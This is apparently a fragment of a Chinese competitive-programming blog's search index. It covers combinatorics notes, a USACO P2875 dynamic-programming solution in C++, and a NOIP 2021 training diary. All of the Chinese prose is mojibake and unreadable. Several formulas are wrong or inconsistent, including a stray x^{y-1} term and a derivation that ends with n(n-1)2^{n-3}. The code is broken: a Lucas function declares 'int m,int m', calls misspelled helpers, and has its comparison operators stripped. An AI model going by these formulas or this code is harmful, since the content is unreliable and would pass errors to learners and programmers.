ä¸ªäººé€‰æ‹©å€™é€‰äººï¼Œç„¶åä»å€™é€‰äººä¸­é€‰ä¸€ä¸ªç­é•¿ä¸å‰¯ç­é•¿ï¼ŒåŒä¸€ä¸ªäººå¯ä»¥èº«å…¼ä¸¤èŒï¼Œæ±‚æœ€ç»ˆæ–¹æ¡ˆæ•°ï¼›ç­‰å·å³è¾¹ä¸ºèº«å…¼ä¸¤èŒä¸ä¸¤ä¸ªäººåˆ†åˆ«å½“é€‰çš„ä¸¤ç§æƒ…å†µï¼Œæœ‰åŠ æ³•åŸç†ç›¸åŠ å¾—åˆ°ï¼Œå³ï¼š n \\times 2^{n - 1} + n \\times (n - 1) \\times 2^{n - 2} = n \\times (n + 1) \\times 2^{n - 2}$(4)$ ä¹Ÿä¸€æ ·å¯ä»¥è½¬åŒ–ä¸ºæ¨¡å‹ã€‚ç­‰å·å³è¾¹ä¸ºç­çº§ä¸­æœ‰ $n$ ä¸ªç”·ç”Ÿå’Œ $n$ ä¸ªå¥³ç”Ÿï¼Œä»ä¸­é€‰ $n$ äººï¼›ç­‰å·å·¦è¾¹ç›¸å½“äºç­‰ä»·çš„ï¼Œç”·ç”Ÿé€‰ $i$ ä¸ªï¼Œå¥³ç”Ÿé€‰ $n - i$ ä¸ªï¼Œåˆ™æœ‰ï¼š \\sum_{i = 0}^{n} \\tbinom{n}{i} \\times \\tbinom{n}{n - i} = \\sum_{i = 0}^{n} \\tbinom{n}{i}^2 ã€æ‘˜è‡ª CF2077C Binary Subsequence Value Sumé¢˜è§£ã€‘ è¯æ˜ $\\sum_{i=0}^nC_n^ii=n2^{n-1}$$i=C_i^1$ï¼Œåˆ™åŸå¼ç­‰äº $\\sum_{i=0}^nC_n^iC_i^1$ï¼Œè€ƒè™‘å…¶ç»„åˆæ„ä¹‰ï¼Œå³å…ˆä» $n$ ä¸ªå…ƒç´ ä¸­é€‰è‹¥å¹²ä¸ªï¼Œå†ä»è‹¥å¹²ä¸ªå…ƒç´ é‡Œé€‰å‡ºä¸€ä¸ªçš„æ–¹æ¡ˆæ•°ã€‚é‚£æˆ‘ä»¬å…ˆé€‰è¿™ä¸€ä¸ªï¼Œæœ‰ $n$ ç§æ–¹æ¡ˆï¼Œå†ä»å‰©ä¸‹ $n-1$ ä¸ªå…ƒç´ ä¸­é€‰å‡ºè‹¥å¹²ä¸ªï¼Œæœ‰ $2^{n-1}$ ç§æ–¹æ¡ˆï¼Œæ‰€ä»¥æ˜¯ $n2^{n-1}$ã€‚ è¯æ˜ $\\sum_{i=0}^nC_n^ii^2=n(n+1)2^{n-2}$è€ƒè™‘ $i^2=i+i(i-1)=i+2\\times\\frac{i(i-1)}{2}=C_i^1+2C_i^2$ï¼Œåˆ™åŸå¼ç­‰äº $\\sum_{i=0}^nC_n^iC_i^1+2C_n^iC_i^2$ï¼Œç­‰äº $n2^{n-1}+2\\sum_{i=0}^nC_n^iC_i^2$ï¼Œåˆ™æˆ‘ä»¬åªéœ€è§£å†³ $\\sum_{i=0}^nC_n^iC_i^2$ã€‚è€ƒè™‘ç»„åˆæ„ä¹‰ï¼Œå³ä» $n$ ä¸ªå…ƒç´ é‡Œé€‰å‡ºè‹¥å¹²ä¸ªï¼Œå†ä»è‹¥å¹²ä¸ªå…ƒç´ é‡Œé€‰å‡ºä¸¤ä¸ªçš„æ–¹æ¡ˆæ•°ã€‚é‚£æˆ‘ä»¬å…ˆé€‰å‡ºè¿™ä¸¤ä¸ªï¼Œæœ‰ $\\frac{n(n-1)}{2}$ ç§æ–¹æ¡ˆï¼Œç„¶åå†ä»å‰©ä¸‹çš„å…ƒç´ ä¸­é€‰å‡ºè‹¥å¹²ä¸ªï¼Œæœ‰ $2^{n-2}$ ç§æ–¹æ¡ˆï¼Œæ‰€ä»¥æœ‰ $n(n-1)2^{n-3}$ ç§æ–¹æ¡ˆã€‚ äºŒé¡¹å¼å®šç†1. æ¦‚å¿µå¯¹äºæ¯ä¸€ä¸ª $x + y$ çš„é€‰æ‹©ï¼Œåˆ™é€‰ $i$ ä¸ª $x$ï¼Œå‰©ä½™å‡é€‰æ‹© $y$ æ—¶ï¼Œç­”æ¡ˆä¸ºï¼š C^i_n x^i y^{n - i} \\ (1 \\le n \\le i)å› æ­¤æœ‰ï¼š (x + y)^n = C_n^0 x^n y^0 + C^1_n x^{y - 1} y + C^2_n x^{n - 2} y^2 + \\cdots + C^n_n x^0 y^n\\\\= \\sum_{k = 0}^n \\tbinom{n}{k} x^{n - k}y^k2. äºŒé¡¹å¼å®šç†çš„å˜å½¢(1)\\ (x + y)^n = \\sum_{k = 0}^n \\tbinom{n}{n - k} x^{n - k}y^k\\\\ (2)\\ (x + y)^n = \\sum_{k = 0}^n \\tbinom{n}{n - k} x^k y^{n - k}\\\\ (3)\\ (x + y)^n = \\sum_{k = 0}^n \\tbinom{n}{k} x^k y^{n - k}\\\\ (4)\\ å½“\\ y = 1\\ æ—¶ï¼Œ(1 + x)^n = \\sum_{k = 0}^n \\tbinom{n}{k} x^k = \\sum_{k = 0}^n \\tbinom{n}{n - k} x^k\\\\ (5)\\ å½“\\ x = 2,y = 1\\ æ—¶ï¼Œ(x + y)^n = \\sum_{i = 0}^{n} \\tbinom{n}{i}2^i = 3^n\\\\ (6)\\ å½“\\ x = y = 1\\ æ—¶ï¼Œ(x - y)^n = \\sum_{i = 0}^{n} \\tbinom{n}{i}2^i \\times (-1)^i= 0\\\\ (7)\\ å½“\\ x = y = 1\\ æ—¶ï¼Œ(x + y)^n = \\sum_{i = 0}^{n} \\tbinom{n}{i} = 2^n\\\\ (8)\\ \\tbinom{n}{0} + \\tbinom{n}{2} + \\cdots = \\tbinom{n}{1} + \\tbinom{n}{3} + \\cdots = 2^{n - 1}éš”æ¿æ³•1. é¢˜æ„ æŠŠ $n$ ä¸ªç›¸åŒçš„å°çƒï¼Œæ”¾åˆ° $m$ ä¸ªä¸åŒçš„ç›’å­ä¸­ï¼Œç›’å­ä¸èƒ½ä¸ºç©ºï¼Œæ±‚æ–¹æ¡ˆæ•°ã€‚æˆ–è€…æ±‚ $x_1 + x_2 + \\cdots + x_m = n$ çš„æ­£æ•´æ•°è§£ã€‚ è§£æ³• ç›¸å½“äºåœ¨ $n - 1$ ä¸ªé—´éš”ä¸­é€‰æ‹© $m - 1$ ä¸ªé—´éš”ï¼Œå°†å…¶åˆ†ä¸º $m$ ä»½ã€‚æ•…ä¸ºï¼š \\tbinom{n - 1}{m - 1}2. å˜å¼ æŠŠ $n$ ä¸ªç›¸åŒçš„å°çƒï¼Œæ”¾åˆ° $m$ ä¸ªä¸åŒçš„ç›’å­ä¸­ï¼Œç›’å­å¯ä»¥ä¸ºç©ºï¼Œæ±‚æ–¹æ¡ˆæ•°ã€‚æˆ–è€…æ±‚ $x_1 + x_2 + \\cdots + x_m = n$ çš„éè´Ÿæ•´æ•°è§£ã€‚ è§£æ³• ç›¸å½“äºåœ¨å…ˆåœ¨æ¯ä¸ªç›’å­ä¸­æ”¾å…¥ $1$ ä¸ªçƒï¼Œç„¶åæ±‚ $n + m$ ä¸ªç›¸åŒçš„å°çƒæ”¾å…¥ $m$ ä¸ªä¸åŒçš„ç›’å­çš„æ–¹æ¡ˆæ•°ï¼Œç›’å­ä¸èƒ½ä¸ºç©ºã€‚æ•…ä¸ºï¼š \\tbinom{n + m - 1}{m - 1}é”™ä½æ’åˆ—\\forall i \\mid 1 \\le i \\le n,f_i != ié€’æ¨å…¬å¼ä¸ºï¼š f_1 = 0\\\\f_2 = 1\\\\f_i = (i - 1) \\times (f_{i - 1} + f_{i - 2})\\ (i > 2)å¯¹äºç¬¬ $i$ é¡¹ï¼Œå¯ä»¥åœ¨å‰ $i - 1$ ä¸ªæ•°ä¸­é€‰ä¸€ä¸ªæ•°ä¸ç¬¬ $i$ ä¸ªæ•°æ›¿æ¢ï¼Œå…± $i - 1$ ä¸­ï¼Œç„¶åé—®é¢˜å˜ä¸ºæ±‚ $(i - 1) \\times (f_{i - 2})$ã€‚ä¹Ÿå¯ä»¥å°†å‰ $i - 1$ ä¸ªæ•°ä¸­çš„ä¸€ä¸ªæ•°æ”¾åœ¨å‰ i - 1 ä¸ªä½ç½®ä¸­ç¬¦åˆæ¡ä»¶çš„æŸä¸€ä¸ªä½ç½®ï¼Œç›¸å½“äºæ±‚ $(i - 1) \\times f_{i - 1}$ è¿™ä¸€æ–°çš„é”™æ’ã€‚ åœ†æ’åˆ—åŸæ¥æ¯ç»„æ’åˆ—éƒ½æœ‰ $n$ ç§æ’åˆ—ç­‰ä»·ï¼Œæ•…æ–¹æ¡ˆæ•°ä¸ºï¼š \\frac{n!}{n}å¤šé‡é›†åˆçš„æ’åˆ— é›†åˆä¸­æœ‰ $k$ ç§ä¸åŒç±»å‹çš„å¯¹è±¡ï¼Œæ¯ç§æ•°é‡å‡ä¸ºæ— é™ï¼Œä»ä¸­é€‰ $n$ ä¸ªï¼Œæ’åˆ—çš„æ–¹æ¡ˆæ•°ä¸ºï¼š k^n é›†åˆä¸­æœ‰ $k$ ç§ä¸åŒç±»å‹çš„å¯¹è±¡ï¼Œæ¯ç§æ•°é‡åˆ†åˆ«ä¸º $n_1$ è‡³ $n_k$ï¼Œä»ä¸­é€‰ $n$ ä¸ªã€‚ç›¸å½“äºé€‰å‡º $n_1$ ä¸ªä½ç½®æ”¾ç¬¬ $1$ ç§ï¼Œé€‰å‡º $n_2$ ä¸ªä½ç½®æ”¾ç¬¬ $2$ ç§ï¼Œä»¥æ­¤ç±»æ¨ã€‚æ–¹æ¡ˆæ•°ä¸ºï¼š \\tbinom{n}{n_1} \\times \\tbinom{n - n_1}{n_2} \\times \\cdots \\times \\tbinom{n - n_1 - n_2 - \\cdots - n_{k - 1}}{n_k}= \\dfrac{n!}{n_1!n_2!\\cdots n_k!}å¤šé‡é›†åˆçš„ç»„åˆé›†åˆä¸­æœ‰ $k$ ç§ä¸åŒç±»å‹çš„å¯¹è±¡ï¼Œæ¯ç§æ•°é‡å‡ä¸ºæ— é™ï¼Œä»ä¸­é€‰ $n$ ä¸ªã€‚ç­‰ä»·äº $k$ ä¸ªç›¸åŒçš„çƒæ”¾åˆ° $n$ ä¸ªä¸åŒçš„ç›’å­ä¸­ï¼Œç›’å­å¯ä»¥ä¸ºç©ºã€‚æˆ–è€…ç­‰ä»·äºé€‰ $k$ æ¬¡çƒï¼Œæ¯æ¬¡éƒ½å¯ä»¥é€‰ $n$ ç§çƒï¼Œä¸”é€‰æ‹©ä¸åˆ†å…ˆåã€‚ç»„åˆçš„æ–¹æ¡ˆæ•°ä¸ºï¼š \\tbinom{n + k - 1}{k} = \\tbinom{n + k - 1}{n - 1}åº·æ‰˜å±•å¼€1. è®¡ç®—æ’åˆ—çš„æ’åè®¾ $a_i$ è¡¨ç¤º $i$ ä½ç½®å³è¾¹æ¯”å®ƒå°çš„æ•°çš„ä¸ªæ•°ï¼Œåˆ™è¯¥æ’åˆ—ä¹‹å‰çš„æ’åˆ—æ€»æ•°ä¸ºï¼š x = a_1 (n - 1)! + a_2 (n - 2)! + \\cdots + a_n0!å€˜è‹¥ $i$ ä½ç½®ä¸Šçš„æ•°æ¯”è¯¥æ•°å°ï¼Œåˆ™åœ¨å®ƒå³è¾¹çš„æ•°å¯ä»¥éšæ„æ”¾ç½®ï¼Œè‹¥ $i$ ä½ç½®ä¸Šçš„æ•°ç­‰äºè¯¥æ•°ï¼Œåˆ™ç»§ç»­åˆ¤æ–­ $i + 1$ ä½ç½®çš„æ•°çš„æƒ…å†µï¼Œä»¥æ­¤ç±»æ¨ã€‚å› æ­¤å¯ä»¥ç”±åŠ æ³•åŸç†å¾—å¯çŸ¥è¯¥æ’åˆ—ä¹‹å‰çš„æ’åˆ—æ€»æ•°ã€‚æ‰€ä»¥æ±‚æ’åçš„å…¬å¼ä¸ºï¼š ans = 1 + \\sum_{i = 1}^n a_i \\times (n - i)!2. è®¡ç®—ç‰¹å®šæ’åçš„æ’åˆ—å³åº·æ‰˜å±•å¼€çš„é€†å±•å¼€ã€‚ åˆ©ç”¨åº·æ‰˜å±•å¼€çš„å…¬å¼ï¼Œç±»ä¼¼è¿›åˆ¶è½¬æ¢çš„æ–¹å¼å»ç¡®å®šä»é«˜åˆ°åº•çš„æ¯ä¸€ä½ã€‚è‹¥æ’åˆ—é•¿åº¦ä¸º $x$ï¼Œæ±‚ç¼–å·ä¸º $0$ å¼€å§‹çš„ï¼Œç¼–å·ä¸º $k$ çš„æ’åˆ—ã€‚æ–¹æ³•å¦‚ä¸‹ï¼š$p = \\frac{k}{(x - 1)!}$ï¼Œåˆ™è¯´æ˜ç¬¬ä¸€ä½å³è¾¹æœ‰ $p$ ä¸ªæ•°æ¯”å®ƒå°ï¼Œæ‰€ä»¥æœ€é«˜ä½ä¸º $p + 1$ï¼Œç„¶åå–ä½™æ•°é‡å¤æ“ä½œï¼ŒçŸ¥é“ç¡®å®šæ’åˆ—ä¸Šçš„æ‰€æœ‰æ•°å­—ã€‚ 3. æ±‚ä¸‹ä¸€ä¸ªæ’åˆ—å¯¹äºä¸€ä¸ªæ’åˆ—ï¼š$a_1,a_2,\\cdots,a_n$ã€‚ä»åå¾€å‰æ‰¾åˆ°ç¬¬ä¸€ä¸ª $p_i p_{i + 1}$ çš„ä½ç½®ï¼Œä»åå¾€å‰æ‰¾åˆ°ç¬¬ä¸€ä¸ª $p_j p_i$ çš„ä½ç½®ã€‚æœ€åäº¤æ¢ $p_i,p_j$ å¹¶é¢ å€’ $i$ ä½ç½®ä»¥åçš„æ‰€æœ‰å…ƒç´ å³å¯ã€‚ æ–¯ç‰¹æ—æ•°1. ç¬¬ä¸€ç±»æ–¯ç‰¹æ—æ•° æ±‚å°† $n$ ä¸ªä¸åŒçš„ç‰©ä½“æ‘†æˆkä¸ªéç©ºç¯çš„æ–¹æ¡ˆæ•°ã€‚é‡‡ç”¨åŠ¨æ€è§„åˆ’çš„åšæ³•ï¼Œå¯¹äºç¬¬ $i$ ä¸ªç‰©ä½“ï¼Œå¯ä»¥ä»»å–ä¸€ä¸ªç¯åŠ å…¥ï¼Œä¹Ÿå¯ä»¥æ„é€ ä¸€ä¸ªæ–°ç¯ï¼Œæ•…æœ‰ $dp_{n,k} = (n - 1)dp_{n - 1,k} + dp_{n - 1,k - 1}$ã€‚ï¼ˆå½“ç„¶æœ‰åˆå§‹åŒ– $dp_{0,0} = dp_{1,1} = 1$ï¼‰ 2.ç¬¬äºŒç±»æ–¯ç‰¹æ—æ•° æ±‚å°† $n$ ä¸ªä¸åŒçš„ç‰©ä½“åˆ†æˆ $k$ ä¸ªéç©ºé›†åˆçš„æ–¹æ¡ˆæ•°ã€‚é‡‡ç”¨åŠ¨æ€è§„åˆ’çš„åšæ³•ï¼Œå¯¹äºç¬¬ $i$ ä¸ªç‰©ä½“ï¼Œå¯ä»¥ä»»å–ä¸€ä¸ªé›†åˆåŠ å…¥ï¼Œä¹Ÿå¯ä»¥æ”¾å…¥ä¸€ä¸ªæ–°é›†åˆä¸­ï¼Œæ•…æœ‰ $k \\times dp_{n - 1,k} + dp_{n - 1,k - 1}$ã€‚ï¼ˆå½“ç„¶æœ‰åˆå§‹åŒ– $dp_{i,i} = dp_{i,1} = 1$ï¼‰ å¡ç‰¹å…°æ•°é¢˜ç›®æè¿°ï¼Œå‡å¦‚æœ‰ä¸€ä¸ª $n\\times n$ çš„ç½‘ç»œï¼Œä»å·¦ä¸‹è§’ $A$ ç‚¹èµ°åˆ°å³ä¸Šè§’ $B$ ç‚¹ä¸”ä¸ç©¿è¶Šå¯¹è§’çº¿çš„æ–¹æ¡ˆæ•°ã€‚é€šè¿‡å‡ ä½•æ–¹æ³•è¯æ˜ï¼Œç­”æ¡ˆä¸ºï¼š \\text{Catalan}(n)= \\tbinom{2n}{n} - \\tbinom{2n}{n + 1}= \\frac{1}{n + 1}\\tbinom{2n}{n}= \\frac{1}{n + 1}\\sum_{i = 0}^{n}\\tbinom{n}{i}^2å…¶å®ƒçš„è¡¨è¾¾å½¢å¼è¿˜æœ‰ï¼š C(n + 1) = \\sum_{i = 0}^n C(i)\\times C(n - i),C(0) = 1\\\\C(n + 1) = \\frac{2(2n + 1)}{n + 2} C(n),C(0) = 1å¸¸è§åº”ç”¨ï¼š åˆæ³•çš„æ‹¬å·åŒ¹é… $n$ ä¸ªèŠ‚ç‚¹äºŒå‰æ ‘çš„å½¢æ€æ•° å…¥æ ˆå‡ºæ ˆçš„æ’åˆ—æ€»æ•° å‡¸ $n+2$ è¾¹å½¢çš„åˆ†å‰² æ”¾çƒé—®é¢˜è®¾ $dp_{i,j}$ è¡¨ç¤º $i$ ä¸ªå°çƒæ”¾åˆ° $j$ ä¸ªç›’å­çš„æ–¹æ¡ˆæ•°ã€‚ 1. çƒç›¸åŒï¼Œç›’ç›¸åŒï¼Œå¯ä¸ºç©ºã€‚åˆ™æœ‰ï¼š$dp_{i,j} = dp_{i,j - 1} + dp_{i - 1,j}$ã€‚ 2. çƒç›¸åŒï¼Œç›’ç›¸åŒï¼Œä¸å¯ä¸ºç©ºã€‚åˆ™æœ‰ï¼š$dp_{i,j} = dp_{i - j,j}$ã€‚ 3. çƒä¸åŒï¼Œç›’ä¸åŒï¼Œå¯ä¸ºç©ºã€‚åˆ™æœ‰ï¼š$j^i$ã€‚ 4. çƒä¸åŒï¼Œç›’ç›¸åŒï¼Œä¸å¯ä¸ºç©ºã€‚åˆ™æœ‰ï¼š$dp_{i,j} = dp_{i - 1,j} + dp_{i - 1,j - 1}$ã€‚ 5. çƒä¸åŒï¼Œç›’ä¸åŒï¼Œä¸å¯ä¸ºç©ºã€‚åˆ™æœ‰ï¼š$dp_{i,j} \\times {j!}$ã€‚ 6. çƒä¸åŒï¼Œç›’ç›¸åŒï¼Œå¯ä¸ºç©ºã€‚æšä¸¾ç›’å­æ•°ï¼Œåˆ™æœ‰ï¼š$dp_{i,j} = dp_{i - 1,j} + dp_{i - 1,j - 1}$ã€‚ 7. çƒç›¸åŒï¼Œç›’ä¸åŒï¼Œä¸å¯ä¸ºç©ºã€‚éš”æ¿æ³•ï¼Œåˆ™æœ‰ï¼š$\\tbinom{i - 1}{j - 1}$ã€‚ 8. çƒç›¸åŒï¼Œç›’ä¸åŒï¼Œå¯ä¸ºç©ºã€‚åˆ™æœ‰ï¼š$\\tbinom{i + j - 1}{j - 1}$ã€‚ å¢å¡æ–¯å®šç†n = (a_0a_1\\cdots a_k)_p\\\\m = (b_0b_1\\cdots b_k)_p\\\\\\tbinom{n}{m} \\equiv \\Pi_{i = 0}^{k} \\tbinom{a_i}{b_i} \\pmod p\\\\\\tbinom{n}{m} = \\tbinom{n \\bmod p}{m \\bmod p} \\times \\tbinom{\\lfloor\\frac{n}{p}\\rfloor}{\\lfloor\\frac{m}{p}\\rfloor} \\bmod pè¯æ˜ç•¥ã€‚ä»£ç å¦‚ä¸‹ï¼š int calc (int n,int m) if (n m) return 0; return 1ll * fac[n] * inv(fac[m]) % MOD * inc (fac[n - m]) % MOD;int lucas (int m,int m) if (!m) return 1; return 1ll * lucas (n / MOD,m / MOD) * clac (n % MOD,m % MOD) % MOD;","categories":["Algorithm"]},{"title":"é¢˜è§£ï¼šP2875 [USACO07FEB]The Cow Lexicon S","path":"/2021/11/08/P2875/","content":"è¿™é“é¢˜å’Œ $\\texttt{P2432}$ çš„é¢˜ç›®æ˜¯ä¸€æ ·çš„ã€‚è€ƒè™‘åŠ¨æ€è§„åˆ’çš„ä½œæ³•ï¼Œè®¾ $dp[i]$ è¡¨ç¤ºåŸå­—ç¬¦ä¸²çš„å‰ $i$ ä½æœ€å°‘éœ€è¦åˆ é™¤çš„å­—ç¬¦çš„æ•°é‡ï¼Œæ˜¾ç„¶æœ€åçš„ç­”æ¡ˆæ˜¯ $dp[L]$ã€‚ å¯¹äºåˆå§‹å€¼ï¼Œå› ä¸ºæ±‚æœ€å°å€¼ï¼Œæ‰€ä»¥å…ˆæŠŠ $dp[i]$ å‡è®¾ç½®ä¸º $+\\infty$ï¼ŒåŒæ—¶ç”±è½¬ç§»æ–¹ç¨‹çš„å«ä¹‰å¯çŸ¥ $dp[0] = 0$ã€‚ç„¶åå°±æ˜¯å¤„ç†å•è¯ä¸æ–‡ç« æ˜¯å¦èƒ½åŒ¹é…çš„æ ¸å¿ƒæ€è·¯äº†ï¼Œè®¾ $dx$ è¡¨ç¤ºå½“å‰åŒ¹é…åˆ°çš„ä½ç½® $i$ï¼Œ$dy$ è¡¨ç¤ºç¬¬ $j$ ä¸ªå•è¯çš„é•¿åº¦ $len[j]$ã€‚ä» $i$ ä¸å•è¯çš„æœ«å°¾å¼€å§‹ï¼Œè‹¥æˆåŠŸåŒ¹é…ï¼Œåˆ™ $dx,dy$ å‡å‡ä¸€ï¼Œå¦åˆ™ $dx$ å‡ä¸€ã€‚å¦‚æœ $dy$ çš„å€¼å…ˆå˜ä¸º $0$ æˆ–è€… $dx,dy$ åŒæ—¶å˜ä¸º $0$ï¼Œè¿™è¯´æ˜è¯¥å•è¯èƒ½å¤Ÿåœ¨åŸå­—ç¬¦ä¸²ä¸­åŒ¹é…ï¼›ä½†æ˜¯å¦‚æœä¸èƒ½åŒ¹é…ï¼Œæ˜¾ç„¶åŸå­—ç¬¦ä¸²çš„ç¬¬ $i$ ä¸ªä½ç½®éœ€è¦è¢«åˆ é™¤ã€‚ æ‰€ä»¥æœ‰çŠ¶æ€è½¬ç§»æ–¹ç¨‹ $dp[i] = \\min (dp[i - 1] + 1,dp[dx] + (i - dx - len[j])$ï¼Œæ˜¾ç„¶æ­¤æ—¶çš„ $dx$ è¡¨ç¤ºåœ¨åŒ¹é…ä¹‹å $dx$ çš„å€¼ï¼Œè€Œä¸æ˜¯åˆå§‹çš„ $dx = i$ã€‚ è®²äº†è¿™ä¹ˆå¤šï¼Œå†çœ‹ç€ä»£ç ç†è§£ä¸€ä¸‹å­ï¼ #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 605;const int MOD = 1e9 + 7;inline int read ();int n,m,dlen[MAX],dp[MAX];char str[MAX 1],cor[MAX][30]; int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); scanf (%s,str + 1); for (int i = 1;i = n;++i) scanf (%s,cor[i] + 1); dlen[i] = strlen (cor[i] + 1);//å•è¯çš„é•¿åº¦ init (dp);//åˆå§‹åŒ– dp[0] = 0; for (int i = 1;i = m;++i) dp[i] = dp[i - 1] + 1; for (int j = 1;j = n;++j)//å…±æœ‰ n ä¸ªå•è¯ï¼Œä¸€ä¸€åŒ¹é… int dx = i,dy = dlen[j]; while (dx dy)//è¾¹ç•Œæ¡ä»¶ if (str[dx] == cor[j][dy]) --dx,--dy; else --dx; if (!dy) dp[i] = min (dp[i],dp[dx] + (i - dx - dlen[j]));//æˆåŠŸåŒ¹é…æ‰èƒ½è¿›è¡ŒçŠ¶æ€è½¬ç§» printf (%d ,dp[m]);//æ­¤å¤„ä¸º m è€Œä¸æ˜¯ n å“¦ï¼ return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"2021 NOIP å¤‡èµ›è®°","path":"/2021/11/06/NOIP2021/","content":"åæ ‡ $\\texttt{ZJ}$ $\\texttt{Day -16 2021.11.04}$æœ¬ä»¥ä¸ºä»Šå¹´æ²¡æœºä¼šäº†ï¼ˆé€€å½¹å‡†å¤‡ï¼Œæ²¡æƒ³åˆ°é€šè¿‡ä»Šå¹´ä¸ŠåŠå¹´æ‰“çš„ $\\texttt{NOI Online}$ å‰ $25\\%$ æŠ¥åæˆåŠŸäº†ã€‚ $\\texttt{Day -14 2021.11.06}$æœºæˆ¿æ‰“äº†å¥—è®­ç»ƒèµ›ï¼Œåˆ†æ•°ä¸€èˆ¬èˆ¬ï¼Œå› ä¸ºä¸æ˜¯æ­£å¼æ¯”èµ›ï¼Œå†™é¢˜æ—¶é—´æœ¬æ¥å°±ä¸å¤šï¼Œå¤–åŠ  $\\texttt{T2}$ ç»•äº†å¾ˆä¹…ï¼Œæ‰€ä»¥åä¸¤é¢˜åŸºæœ¬éª—åˆ†ï¼Œæœ€å $100 + 100 + 10 + 30 = 240$ æ»šç²—ã€‚ $\\texttt{T1}$ ç¬¬ä¸€çœ¼çœ‹ä»¥ä¸ºæ˜¯ $\\texttt{dp}$ï¼Œç¨å¾®æƒ³äº†ä¸€ä¸‹ï¼Œå†ç…äº†çœ¼æ•°æ®èŒƒå›´ï¼Œå‘ç°å°±æ˜¯é“å¼±æ™ºæ¨¡æ‹Ÿï¼Œç„¶åæœæ–­ç”¨æ ˆåˆ‡äº†ã€‚ï¼ˆå°æ’æ›²å°±æ˜¯æ ˆä¸åˆ¤ç©ºï¼Œç„¶åä¸€ç›´è¿è¡Œé”™è¯¯â€¦â€¦ï¼‰ $\\texttt{T2}$ ä¸€å¼€å§‹æ²¡ä»€ä¹ˆæ€è·¯ï¼Œç›´æ¥æ‰“äº†ä¸ªçˆ†æœå¤–åŠ  $n = 4$ çš„ç‰¹åˆ¤å¤§æ¦‚ $40pts$ã€‚ç„¶åå°±ä¸€ç›´åœ¨æ€è€ƒï¼Œæ„Ÿè§‰æœ‰è§„å¾‹å¯å¾ªä½†æ˜¯åˆç ä¸å‡ºæ¥ã€‚æƒ³äº†å¤§æ¦‚åŠå°æ—¶ç„¶åå’Œèº«è¾¹å¤§ä½¬äº¤æµäº†ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥ä»ç»“æœå€’é€€ï¼Œäºæ˜¯å°±å¼€å§‹ç–¯ç‹‚é€’å½’ã€‚æ¥ä¸‹å»å°±æ˜¯å…³äºå­—å…¸åºçš„é—®é¢˜ï¼Œæ¨¡æ‹Ÿäº†ä¸€ä¸‹å‘ç°å› ä¸ºå­˜åœ¨å¯¹ç§°æ€§ï¼Œæ‰€ä»¥å¯ä»¥è¾¹é€’å½’è¾¹æš´åŠ›äº¤æ¢ã€‚å·®ä¸å¤šåˆæ˜¯åŠå°æ—¶ç å®Œäº†ï¼Œä»¥ä¸ºè‡ªå·±æ‰“äº†ä¸ªå¯èƒ½è¶…æ—¶çš„ç®—æ³•ï¼Œåæ¥æ‰å‘ç°åˆæ˜¯æ—¶é—´å¤æ‚åº¦ç®—é”™äº†ï¼ˆ$\\texttt{CSP}$ æƒ¨ç—›æ•™è®­ï¼‰ï¼Œé‡æ–°è®¡ç®—å‘ç°æ˜¯ $O(2^n \\times n)$ï¼Œé‚£åº”è¯¥å°±æ˜¯æ­£è§£äº†ã€‚ $\\texttt{T3}$ å…ˆåæ§½ä¸€ä¸‹ $\\texttt{SPJ}$ å› ä¸ºä¸€å®šè¦å’Œæ ‡å‡†ç­”æ¡ˆä¸€æ ·è¾“å‡ºä¹ä½å°æ•°æ—¶æ‰èƒ½å¾—åˆ†ï¼Œæ‰€ä»¥å·®è¯„å·®è¯„å·®è¯„ï¼èµ›æ—¶æ²¡å•¥æ€è·¯ï¼Œæ‰€ä»¥å°±éª—äº†æœ€ç®€å•çš„ä¸€ä¸ªæƒ…å†µæ‹¿äº† $10pts$ï¼Œåæ¥å‘ç°æœ‰ä¸ªåœ°æ–¹å†™é”™äº†ï¼Œæœ¬æ¥è¿˜èƒ½å†æ‹¿ï¼ˆéª—ï¼‰ $10pts$ çš„ã€‚ $\\texttt{T4}$ ç›´æ¥è¾“å‡ºäº† IMPOSSIBLEï¼Œæ²¡æƒ³åˆ°ç«Ÿç„¶æ‹¿äº† $30pts$ï¼ˆæœ‰ CCF é‚£å‘³å„¿äº†ï¼‰ã€‚ $\\texttt{Day -13 2021.11.07}$è¡¥æ˜¨å¤©çš„é‚£å¥—æ¨¡æ‹Ÿèµ›ã€‚ å‘ç° $\\texttt{T3}$ å°±æ˜¯ä¸€ä¸ª $\\texttt{dp}$ã€‚æœ‰ä¸€ä¸ªå‰ç½®ç»“è®ºå°±æ˜¯å°† $p[i]$ ä»å°åˆ°å¤§æ’åºåè‚¯å®šæ˜¯å»é€‰æ‹©ä¸€æ®µå‰ç¼€å’Œä¸€æ®µåç¼€ã€‚è®¾ $f[i][j]/h[i][j]$ è¡¨ç¤ºé€‰æ‹©å‰/å $i$ ä¸ªåŒå­¦,æœ‰ $j$ ä¸ªåŒå­¦æŠ•â€œå¥½â€çš„æ¦‚ç‡ã€‚å¯¹äºç¬¬ $i$ ä½ï¼Œåˆ†ç±»è®¨è®ºæ˜¯å¦æŠ•â€œå¥½â€ï¼Œäºæ˜¯å°±æœ‰è½¬ç§»æ–¹ç¨‹ï¼ˆ$h[i][j]$ çš„åŒç†å¯çŸ¥ï¼‰ï¼š \\begin{cases} f[i][j]=f[i - 1][j] \\times (1 - p[i])\\ (j = 0)\\\\ f[i][j]=f[i - 1][j] \\times (1 - p[i]) + f[i - 1][j - 1] \\times p[i]\\ (j > 0) \\end{cases}å½“ç„¶ï¼Œåˆå§‹çš„æ¡ä»¶è‚¯å®šæ˜¯ $f[0][0] = h[0][0] = 1$ï¼Œå°±æ˜¯è¯´å‰ $0$ ä½åŒå­¦è‚¯å®šæ²¡æœ‰äººä¼šæŠ•â€œå¥½â€ã€‚æœ€åæ±‚ç­”æ¡ˆçš„æ—¶å€™ï¼Œå› ä¸ºè¦å¹³ç¥¨ï¼Œä¹Ÿå°±æ˜¯è¯´é€‰ $\\frac{k}{2}$ ä½åŒå­¦æŠ•â€œå¥½â€ã€‚å†é€‰å®š $k$ 